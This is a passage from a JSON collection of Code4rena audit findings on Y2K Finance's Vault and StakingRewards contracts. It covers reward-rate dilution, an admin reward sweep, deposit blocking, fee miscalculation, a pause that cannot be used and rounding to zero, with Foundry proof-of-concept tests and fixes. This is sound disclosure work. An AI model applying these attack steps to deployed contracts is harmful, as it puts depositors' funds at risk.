      ]
    },
    {
      "id": "5792",
      "title": "[M-11] StakingRewards reward rate can be dragged out and diluted",
      "impact": "MEDIUM",
      "content": "\nSimilar to <https://github.com/code-423n4/2022-02-concur-findings/issues/183>.\n\n            if (block.timestamp >= periodFinish) {\n                rewardRate = reward.div(rewardsDuration);\n            } else {\n                uint256 remaining = periodFinish.sub(block.timestamp);\n                uint256 leftover = remaining.mul(rewardRate);\n                rewardRate = reward.add(leftover).div(rewardsDuration);\n            }\n\nThe StakingRewards.notifyRewardAmount function receives a reward amount and extends the current reward end time to now + rewardsDuration.\nIt rebases the currently remaining rewards + the new rewards (reward + leftover) over this new rewardsDuration period.\nThis can lead to a dilution of the reward rate and rewards being dragged out forever by malicious new reward deposits.\n\n### Proof of Concept\n\nImagine the current rewardRate is 1000 rewards / rewardsDuration.\n\n20% of the rewardsDuration passed, i.e., now = lastUpdateTime + 20% &ast; rewardsDuration.\n\nA malicious actor notifies the contract with a reward of 0: notifyRewardAmount(0).\n\nThen the new rewardRate = (reward + leftover) / rewardsDuration = (0 + 800) / rewardsDuration = 800 / rewardsDuration.\n\nThe rewardRate just dropped by 20%.\nThis can be repeated infinitely.\nAfter another 20% of reward time passed, they trigger notifyRewardAmount(0) to reduce it by another 20% again:\nrewardRate = (0 + 640) / rewardsDuration = 640 / rewardsDuration.\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/rewards/StakingRewards.sol#L183-L195>\n\n### Recommended Mitigation Steps\n\nThe rewardRate should never decrease by a notifyRewardAmount call.\nConsider not extending the reward payouts by rewardsDuration on every call.\nperiodFinish probably shouldn't change at all, the rewardRate should just increase by rewardRate += reward / (periodFinish - block.timestamp).\n\nAlternatively, consider keeping the rewardRate constant but extend periodFinish time by += reward / rewardRate.\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/52)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/52#issuecomment-1295879950):**\n > Admin privilege issue that would allow the admin to dilute current rewards. Medium severity due to loss of yield for all depositors from dilution of `rewardRate`.\n> \n> \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StakingRewards.notifyRewardAmount function of the code-423n4/2022-09-y2k-finance repository. This function receives a reward amount and extends the current reward end time to now + rewardsDuration. It can lead to a dilution of the reward rate and rewards being dragged out forever by malicious new reward deposits.\n\nA proof of concept was provided to illustrate how this vulnerability could be exploited: Imagine the current rewardRate is 1000 rewards / rewardsDuration. 20% of the rewardsDuration passed, a malicious actor notifies the contract with a reward of 0. Then the new rewardRate drops by 20%. This can be repeated infinitely.\n\nNo tools were used to find this vulnerability. Two recommended mitigation steps were provided to fix this vulnerability. The rewardRate should never decrease by a notifyRewardAmount call. Consider not extending the reward payouts by rewardsDuration on every call, or keeping the rewardRate constant but extend periodFinish time by += reward / rewardRate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/52",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "5791",
      "title": "[M-10] StakingRewards.sol#notifyRewardAmount() Improper reward balance checks can make some users unable to withdraw their rewards",
      "impact": "MEDIUM",
      "content": "\nSimilar to <https://github.com/code-423n4/2022-02-concur-findings/issues/209>\n\n            uint256 balance = rewardsToken.balanceOf(address(this));\n            require(\n                rewardRate <= balance.div(rewardsDuration),\n                \"Provided reward too high\"\n            );\n\nIn the current implementation, the contract only checks if balanceOf rewardsToken is greater than or equal to the future rewards.\n\nHowever, under normal circumstances, since users can not withdraw all their rewards in time, the balance in the contract contains rewards that belong to the users but have not been withdrawn yet. This means the current checks can not be sufficient enough to make sure the contract has enough amount of rewardsToken.\n\nAs a result, if the rewardsDistribution mistakenly notifyRewardAmount with a larger amount, the contract may end up in a wrong state that makes some users unable to claim their rewards.\n\nGiven:\n\n*   rewardsDuration = 7 days;\n\n1.  Alice stakes 1,000 stakingToken;\n2.  rewardsDistribution sends 100 rewardsToken to the contract;\n3.  rewardsDistribution calls `notifyRewardAmount()` with amount = 100;\n4.  7 days later, Alice calls `earned()` and it returns 100 rewardsToken, but Alice choose not to `getReward()` for now;\n5.  rewardsDistribution calls `notifyRewardAmount()` with amount = 100 without send any fund to contract, the tx will succeed;\n6.  7 days later, Alice calls `earned()` 200 rewardsToken, when Alice tries to call `getReward()`, the transaction will fail due to insufficient balance of rewardsToken.\n\nExpected Results:\n\nThe tx in step 5 should revert.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/rewards/StakingRewards.sol#L201-L205>\n\n### Recommended Mitigation Steps\n\nConsider changing the function notifyRewardAmount to addRward and use transferFrom to transfer rewardsToken into the contract:\n\n    function addRward(uint256 reward)\n        external\n        updateReward(address(0))\n    {\n        require(\n            msg.sender == rewardsDistribution,\n            \"Caller is not RewardsDistribution contract\"\n        );\n\n        if (block.timestamp >= periodFinish) {\n            rewardRate = reward / rewardsDuration;\n        } else {\n            uint256 remaining = periodFinish - block.timestamp;\n            uint256 leftover = remaining * rewardRate;\n            rewardRate = (reward + leftover) / rewardsDuration;\n        }\n\n        rewardsToken.safeTransferFrom(msg.sender, address(this), reward);\n\n        lastUpdateTime = block.timestamp;\n        periodFinish = block.timestamp + rewardsDuration;\n        emit RewardAdded(reward);\n    }\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/50)** \n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StakingRewards.sol contract, which is part of the 2022-09-y2k-finance project. The vulnerability is related to the contract’s reward rate calculation, which can lead to users not being able to claim their rewards if the rewardsDistribution mistakenly notifiesRewardAmount with a larger amount. \n\nThe impact of this vulnerability is that the contract only checks if balanceOf rewardsToken is greater than or equal to the future rewards, and does not take into account rewards that have not been withdrawn yet. This means that if the rewardsDistribution mistakenly notifiesRewardAmount with a larger amount, the contract may end up in a wrong state that makes some users unable to claim their rewards.\n\nThe proof of concept for this vulnerability is provided on the GitHub repository. The recommended mitigation step is to consider changing the function notifyRewardAmount to addReward and use transferFrom to transfer rewardsToken into the contract. This allows the contract to check the balance of rewardsToken before notifyingRewardAmount, and will ensure that users can claim their rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/50",
      "tags": [],
      "finders": [
        "cccz",
        "csanuragjain  pashov"
      ]
    },
    {
      "id": "5790",
      "title": "[M-09] StakingRewards: recoverERC20() can be used as a backdoor by the owner to retrieve rewardsToken",
      "impact": "MEDIUM",
      "content": "\nSimilar to <https://github.com/code-423n4/2022-02-concur-findings/issues/210>\nStakingRewards.recoverERC20 rightfully checks against the stakingToken being sweeped away.\nHowever, there’s no check against the rewardsToken.\nThis is the case of an admin privilege, which allows the owner to sweep the rewards tokens, perhaps as a way to rug depositors.\n\n        function recoverERC20(address tokenAddress, uint256 tokenAmount)\n            external\n            onlyOwner\n        {\n            require(\n                tokenAddress != address(stakingToken),\n                \"Cannot withdraw the staking token\"\n            );\n            ERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n            emit Recovered(tokenAddress, tokenAmount);\n        }\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/rewards/StakingRewards.sol#L213-L223>\n\n### Recommended Mitigation Steps\n\nAdd an additional check\n\n            require(\n                tokenAddress != address(rewardsToken),\n                \"Cannot withdraw the rewards token\"\n            );\n\n**[scaraven (warden) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49#issuecomment-1251509588):**\n > I'm curious what others think about this issue, if users do not receive any reward tokens is that really a problem? Users are still able to withdraw their ERC1155 tokens at any time, and vaults still work as expected. If the admin is malicious, users will miss out on tokens which will be worthless after a rugpull anyway.\n\n**[MiguelBits (Y2K Finance) disputed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49#issuecomment-1263075624):**\n > This is how synthetix rewards work, I forked their smart contracts.\n\n**[HickupHH3 commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49#issuecomment-1295781746):**\n > Including this issue, issues [#50](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/50), [#51](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/51) and [#52](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/52) can be considered to be admin privilege findings. There's active discussion revolving how findings of this category should be handled / standardized.\n> \n> For now, I'm keeping the medium severity due to historical context (past contest references). l also reproduce the classification rationale that I gave for a previous contest below:\n> \n> > ### Classification and thought process\n> > The issues raised about rugpull vulnerabilities via centralisation risks can be broadly classified into 2 categories:\n> \n> > 1. Those that can be mitigated with contract modifications. Examples include:\n> > - ensuring upper / lower proper bounds on key variables (fees not exceeding max threshold, for instance)\n> > - adding safeguards and conditional checks (require statements)\n> > 2) Those that can't be strictly enforced\n> > - Use multisig, put admin under timelock\n> \n> > Category 1 can be separated into the various attack vectors and actors (admin / strategist), as the mitigation is more tangible in nature. This way, the recommended fixes can also be easily identified and adopted. A warden that grouped multiple attack vectors together will have their issue made the primary issue; the rest will be marked as duplicates of it. \n> \n> > Regarding category 2, for issues that are generic \"put admin under timelock\" without explaining how and why a compromised owner / strategist can rug, as per the rulebook and judges' general consensus, I will downgrade their severity to QA. Those that explained the impact and vulnerability in detail will be grouped together with medium severity because there isn't much that can be done about it.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract known as StakingRewards.sol. The vulnerability allows the owner of the contract to sweep away rewards tokens, which could be used to rug depositors. The code of the contract is provided in the report, and a proof of concept is also provided. \n\nThe vulnerability is similar to another one found in a different contract. The impact of this vulnerability is that it allows the owner of the contract to sweep away rewards tokens, which could be used to rug depositors.\n\nTo mitigate this vulnerability, the report recommends adding an additional check to the code of the contract. This check would prevent the owner from withdrawing the rewards token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49",
      "tags": [],
      "finders": [
        "csanuragjain",
        "pashov",
        "cccz",
        "Saintcode_",
        "Respx",
        "fatherOfBlocks",
        "unforgiven"
      ]
    },
    {
      "id": "5789",
      "title": "[M-08] `timewindow` can be changed unexpectedly that blocks users from calling `deposit` function",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L87-L91>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L152-L174>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L327-L338>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L287-L289>\n\n### Impact\n\nAs shown by the following `epochHasNotStarted` modifier, which is used by the `deposit` function below, users can only deposit when `block.timestamp <= idEpochBegin[id] - timewindow` holds true. Before depositing, a user can check if this relationship is true at that moment; if so, she or he can call the `deposit` function. However, just before the user's `deposit` function call is executed, the admin unexpectedly calls the `VaultFactory.changeTimewindow` function below, which further calls the `Vault.changeTimewindow` function below, to increase the `timewindow`. Since the admin's `VaultFactory.changeTimewindow` transaction is executed before the user's `deposit` transaction and the `timewindow` change takes effect immediately, it is possible that the user's `deposit` function call will revert. Besides wasting gas, the user can feel confused and unfair because her or his `deposit` transaction should be executed successfully if `VaultFactory.changeTimewindow` is not called unexpectedly.\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L87-L91>\n\n```solidity\n    modifier epochHasNotStarted(uint256 id) {\n        if(block.timestamp > idEpochBegin[id] - timewindow)\n            revert EpochAlreadyStarted();\n        _;\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L152-L174>\n\n```solidity\n    function deposit(\n        uint256 id,\n        uint256 assets,\n        address receiver\n    )\n        public\n        override\n        marketExists(id)\n        epochHasNotStarted(id)\n        nonReentrant\n        returns (uint256 shares)\n    {\n        // Check for rounding error since we round down in previewDeposit.\n        require((shares = previewDeposit(id, assets)) != 0, \"ZeroValue\");\n\n        asset.transferFrom(msg.sender, address(this), shares);\n\n        _mint(receiver, id, shares, EMPTY);\n\n        emit Deposit(msg.sender, receiver, id, shares, shares);\n\n        return shares;\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L327-L338>\n\n```solidity\n    function changeTimewindow(uint256 _marketIndex, uint256 _timewindow)\n        public\n        onlyAdmin\n    {\n        address[] memory vaults = indexVaults[_marketIndex];\n        Vault insr = Vault(vaults[0]);\n        Vault risk = Vault(vaults[1]);\n        insr.changeTimewindow(_timewindow);\n        risk.changeTimewindow(_timewindow);\n\n        emit changedTimeWindow(_marketIndex, _timewindow);\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L287-L289>\n\n```solidity\n    function changeTimewindow(uint256 _timewindow) public onlyFactory {\n        timewindow = _timewindow;\n    }\n```\n\n### Proof of Concept\n\nPlease add the following `error` and append the following test in `test\\AssertTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    error EpochAlreadyStarted();\n\n    function testChangeTimeWindowUnexpectedly() public {\n        vm.deal(alice, AMOUNT);\n        vm.deal(chad, AMOUNT * CHAD_MULTIPLIER);\n\n        vm.startPrank(admin);\n        FakeOracle fakeOracle = new FakeOracle(oracleFRAX, STRIKE_PRICE_FAKE_ORACLE);\n        vaultFactory.createNewMarket(FEE, tokenFRAX, DEPEG_AAA, beginEpoch, endEpoch, address(fakeOracle), \"y2kFRAX_99*\");\n        vm.stopPrank();\n\n        address hedge = vaultFactory.getVaults(1)[0];\n        address risk = vaultFactory.getVaults(1)[1];\n        \n        Vault vHedge = Vault(hedge);\n        Vault vRisk = Vault(risk);\n\n        // alice is able to deposit in hedge vault before the time window change\n        vm.startPrank(alice);\n        ERC20(WETH).approve(hedge, AMOUNT);\n        vHedge.depositETH{value: AMOUNT}(endEpoch, alice);\n        vm.stopPrank();\n\n        // admin changes time window unexpectedly, which takes effect immediately\n        vm.startPrank(admin);\n        vaultFactory.changeTimewindow(1, 5 days);\n        vm.stopPrank();\n\n        // chad is unable to deposit in risk vault after the time window change\n        vm.startPrank(chad);\n        ERC20(WETH).approve(risk, AMOUNT * CHAD_MULTIPLIER);\n\n        vm.expectRevert(EpochAlreadyStarted.selector);\n        vRisk.depositETH{value: AMOUNT * CHAD_MULTIPLIER}(endEpoch, chad);\n        vm.stopPrank();\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling the `VaultFactory.createNewMarket` or `VaultFactory.deployMoreAssets` function, the `timewindow`, which is configured for that moment, can be taken into account in the created asset's `epochBegin`.\n\nThen, <https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L87-L91> can be updated to the following code.\n\n```solidity\n    modifier epochHasNotStarted(uint256 id) {\n        if(block.timestamp > idEpochBegin[id])\n            revert EpochAlreadyStarted();\n        _;\n    }\n```\n\n**[MiguelBits (Y2K Finance) disputed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/483#issuecomment-1262520121):**\n > Working as intended. Added timelock to this function as pointed out in another issue.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/483#issuecomment-1297184178):**\n> Not really an admin privilege issue; time window changes shouldnt be retroactively applied as it changes the T&Cs of users that they were fine with (feeling a sense of rug).\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the Vault and VaultFactory contracts in the 2022-09-y2k-finance repository on GitHub. The issue is that users can be prevented from depositing if the admin unexpectedly calls the VaultFactory.changeTimewindow function to increase the timewindow. This can cause users to waste gas and feel confused and unfair.\n\nThe bug is demonstrated with a proof of concept using VSCode and a test in test\\AssertTest.t.sol. The recommended mitigation step is to take the timewindow into account when calling the VaultFactory.createNewMarket or VaultFactory.deployMoreAssets functions and updating the code for the epochHasNotStarted modifier.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/483",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "rokinot",
        "0x1f8b",
        "unforgiven",
        "eierina"
      ]
    },
    {
      "id": "5788",
      "title": "[M-07] User funds lost because they can't `withdraw()` their funds before epoch startTime and they are stuck in positions that become unprofitable even when epoch is not started",
      "impact": "MEDIUM",
      "content": "\nUsers deposit their funds in `Vault` when epoch is not started but as other users deposit funds too or price of pegged token changes, users get different risk to reward. And they may want to withdraw their funds before epoch start time to get out of bad position, but there is no logic in code to give them ability to withdraw their funds before epoch start time.\n\n### Proof of Concept\n\n`Withdraw()` function in `Vault` only allows users to withdraw after epoch ends and there is no logic in the contract to allow users to withdraw their funds before epoch start time.\n\nAfter users deposit their funds, the risk to reward ratio of their investment changes as other users deposit funds in one of the Vaults and user may wants to withdraw their funds if they saw that position is bad for them or maybe the price of that token has been changed dramatically before epoch startTime and users wants to withdraw. But, there is no functionality that gives users the ability to withdraw their funds before epoch start time and users lose control of their funds after depositing and before epoch start time. As epoch is not started yet, users should be able to withdraw their funds but there is no such functionality in the code.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd some logic to give users the ability to withdraw funds before epoch start time.\n\n**[MiguelBits (Y2K Finance) disputed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/447#issuecomment-1262930369):**\n > Working as intended.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault smart contract, which does not allow users to withdraw their funds before the epoch start time. This means that users lose control of their funds after depositing and before the epoch start time. As a result, users may be stuck in a bad position, or the price of the token may have changed dramatically before the epoch start time, and users would not be able to withdraw their funds. The vulnerability was discovered using the VIM tool. The recommended mitigation step is to add logics to the contract to allow users to withdraw their funds before the epoch start time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/447",
      "tags": [],
      "finders": [
        "unforgiven",
        "carrotsmuggler  cccz"
      ]
    },
    {
      "id": "5787",
      "title": "[M-06] Fees are taken on risk collateral",
      "impact": "MEDIUM",
      "content": "\nFees are taken on funds deposited as collateral.\n\n### Proof of Concept\n\n    uint256 feeValue = calculateWithdrawalFeeValue(entitledShares, id);\n\nIn L226 of Vault.sol#withdraw the fee is taken on the entire collateral deposited by the risk users. This is problematic for two reasons. The first is that the collateral provided by the risk users will likely be many many times higher than the premium being paid by the hedge users. This will create a strong disincentive to use the protocol because it is likely a large portion of the profits will be taken by fees and the risk user may unexpectedly lose funds overall if premiums are too low.\n\nThe second issue is that this method of fees directly contradicts project [documents](https://medium.com/@Y2KFinance/introducing-earthquake-pt-2-6f206cd4b315) which clearly indicate that fees are only taken on the premium and insurance payouts, not when risk users are receiving their collateral back.\n\n### Recommended Mitigation Steps\n\nFee calculations should be restructured to only take fees on premiums and insurance payouts.\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/44)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/44#issuecomment-1282077331):**\n > Agree with the warden. If the withdrawal fee exceeds the premium paid, risk users are disincentivised to provide collateral.  \n> \n> > The second issue is that this method of fees directly contradicts project [documents](https://medium.com/@Y2KFinance/introducing-earthquake-pt-2-6f206cd4b315) which clearly indicate that fees are only taken on the premium and insurance payouts, not when risk users are receiving their collateral back.\n> \n> Not sure if the warden is referring to the fee as the trading fee `c` in the article, but I would agree if it's the case. Implementation isn't according to spec. The actual fees charged might be more than expected.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on a vulnerability in the Vault.sol code of the Y2K Finance project. It is found in lines 203-234 of the code, and the impact is that fees are taken on funds deposited as collateral. The proof of concept demonstrates how the fee is taken on the entire collateral deposited by the risk users. This is problematic for two reasons: it creates a disincentive for users to use the protocol, and it contradicts the project documents which state fees are only taken on the premiums and insurance payouts. The recommended mitigation step is to restructure the fee calculation, so it only takes fees on premiums and insurance payouts.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/44",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5786",
      "title": "[M-05] StakingRewards.sol#stake is intended to be pausable but isn't",
      "impact": "MEDIUM",
      "content": "\nStaking is unable to be paused as intended.\n\n### Proof of Concept\n\nStakingRewards.sol inherits pausable and implements the whenNotPaused modifier on stake, but doesn't implement any method to actually pause or unpause the contract. Pausable.sol only implements internal functions, which requires external or public functions to be implemented to wrap them. Since nothing like this has been implemented, the entire pausing system is rendered useless and staking cannot be paused as is intended.\n\n### Recommended Mitigation Steps\n\nCreate simple external pause and unpause functions that can be called by owner.\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/38)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/38#issuecomment-1280395938):**\n > Great catch!\n> \n> While the contract is taken from Synthetix's StakingRewards; note that they use a [different version of Pausable](https://github.com/Synthetixio/synthetix/blob/develop/contracts/Pausable.sol) that comes with a `setPaused()` function. This is notably absent from OZ's implementation; one has to have the pause and unpause function explicitly created.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in StakingRewards.sol, a smart contract code, which prevents the intended pausing of staking. The code in question is found at the given link. The impact of this vulnerability is that staking cannot be paused as intended. The proof of concept for this vulnerability is that StakingRewards.sol inherits pausable and implements the whenNotPaused modifier on stake, but does not implement any method to actually pause or unpause the contract. This renders the pausing system useless and staking cannot be paused as intended. To fix this vulnerability, it is recommended that the owner creates simple external pause and unpause functions that can be called by the owner.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/38",
      "tags": [
        "Pause",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5785",
      "title": "[M-04] It is possible that receiver and treasury can receive nothing when calling `withdraw` function due to division being performed before multiplication",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234>\n\n### Impact\n\nIn the following `beforeWithdraw` function, `entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(idClaimTVL[id], 1 ether)` can be executed in several places. Because it uses division before multiplication, it is possible that `entitledAmount` is calculated to be 0. As the `withdraw` function shows below, when `entitledAmount` is 0, the receiver and treasury both receive 0. As a result, calling `withdraw` with a positive `assets` input can still result in transferring nothing to the receiver and treasury.\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426>\n\n```solidity\n    function beforeWithdraw(uint256 id, uint256 amount)\n        public\n        view\n        returns (uint256 entitledAmount)\n    {\n        // in case the risk wins aka no depeg event\n        // risk users can withdraw the hedge (that is paid by the hedge buyers) and risk; withdraw = (risk + hedge)\n        // hedge pay for each hedge seller = ( risk / tvl before the hedge payouts ) * tvl in hedge pool\n        // in case there is a depeg event, the risk users can only withdraw the hedge\n        if (\n            keccak256(abi.encodePacked(symbol)) ==\n            keccak256(abi.encodePacked(\"rY2K\"))\n        ) {\n            if (!idDepegged[id]) {\n                //depeg event did not happen\n                /*\n                entitledAmount =\n                    (amount / idFinalTVL[id]) *\n                    idClaimTVL[id] +\n                    amount;\n                */\n                entitledAmount =\n                    amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                        idClaimTVL[id],\n                        1 ether\n                    ) +\n                    amount;\n            } else {\n                //depeg event did happen\n                entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                    idClaimTVL[id],\n                    1 ether\n                );\n            }\n        }\n        // in case the hedge wins aka depegging\n        // hedge users pay the hedge to risk users anyway,\n        // hedge guy can withdraw risk (that is transfered from the risk pool),\n        // withdraw = % tvl that hedge buyer owns\n        // otherwise hedge users cannot withdraw any Eth\n        else {\n            entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                idClaimTVL[id],\n                1 ether\n            );\n        }\n\n        return entitledAmount;\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    )\n        external\n        override\n        epochHasEnded(id)\n        marketExists(id)\n        returns (uint256 shares)\n    {\n        if(\n            msg.sender != owner &&\n            isApprovedForAll(owner, receiver) == false)\n            revert OwnerDidNotAuthorize(msg.sender, owner);\n\n        shares = previewWithdraw(id, assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        uint256 entitledShares = beforeWithdraw(id, shares);\n        _burn(owner, id, shares);\n\n        //Taking fee from the amount\n        uint256 feeValue = calculateWithdrawalFeeValue(entitledShares, id);\n        entitledShares = entitledShares - feeValue;\n        asset.transfer(treasury, feeValue);\n\n        emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);\n        asset.transfer(receiver, entitledShares);\n\n        return entitledShares;\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `test\\AssertTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testReceiveZeroDueToDivBeingPerformedBeforeMul() public {\n        vm.deal(alice, 1e24);\n        vm.deal(chad, 1e24);\n\n        vm.startPrank(admin);\n        FakeOracle fakeOracle = new FakeOracle(oracleFRAX, STRIKE_PRICE_FAKE_ORACLE);\n        vaultFactory.createNewMarket(FEE, tokenFRAX, DEPEG_AAA, beginEpoch, endEpoch, address(fakeOracle), \"y2kFRAX_99*\");\n        vm.stopPrank();\n\n        address hedge = vaultFactory.getVaults(1)[0];\n        address risk = vaultFactory.getVaults(1)[1];\n        \n        Vault vHedge = Vault(hedge);\n        Vault vRisk = Vault(risk);\n\n        // alice deposits 1e24 in hedge vault\n        vm.startPrank(alice);\n        ERC20(WETH).approve(hedge, 1e24);\n        vHedge.depositETH{value: 1e24}(endEpoch, alice);\n        vm.stopPrank();\n\n        // chad deposits 1e24 in risk vault\n        vm.startPrank(chad);\n        ERC20(WETH).approve(risk, 1e24);\n        vRisk.depositETH{value: 1e24}(endEpoch, chad);\n        vm.stopPrank();\n\n        vm.warp(beginEpoch + 10 days);\n\n        // depeg occurs\n        controller.triggerDepeg(SINGLE_MARKET_INDEX, endEpoch);\n\n        vm.startPrank(chad);\n\n        // chad withdraws 1e5 from risk vault\n        vRisk.withdraw(endEpoch, 1e5, chad, chad);\n\n        // the amount to chad is 0 because division is performed before multiplication\n        uint256 entitledShares = vRisk.beforeWithdraw(endEpoch, 1e5);\n\n        // chad receives nothing\n        assertEq(entitledShares, 0);\n        assertEq(ERC20(WETH).balanceOf(chad), 0);\n\n        // the amount to chad would be positive when multiplication is performed before division\n        uint256 entitledShares2 = (1e5 * vRisk.idClaimTVL(endEpoch)) / vRisk.idFinalTVL(endEpoch);\n        assertTrue(entitledShares2 > entitledShares);\n\n        vm.stopPrank();\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n`entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(idClaimTVL[id], 1 ether)` in the `beforeWithdraw` function can be updated to the following code.\n\n```solidity\n    entitledAmount = (amount * idClaimTVL[id]) / idFinalTVL[id]\n```\n\n**[MiguelBits (Y2K Finance) confirmed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/378)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/378#issuecomment-1282115702):**\n > In addition, I recommend adding a check to ensure that `entitledShares` is greater than 0, since it would be possible to have 0 shares if `(amount * idClaimTVL[id])` < `idFinalTVL[id]`.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault.sol code of the 2022-09-y2k-finance project. The vulnerability occurs in the beforeWithdraw function, which is used to calculate the amount of assets the receiver is entitled to withdraw. The code uses division before multiplication, so it is possible that `entitledAmount` is calculated to be 0. When `entitledAmount` is 0, the receiver and treasury both receive 0, even if a positive `assets` input is used. This is demonstrated in the Proof of Concept code provided. The recommended mitigation step is to update the code in the beforeWithdraw function so that multiplication is performed before division.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
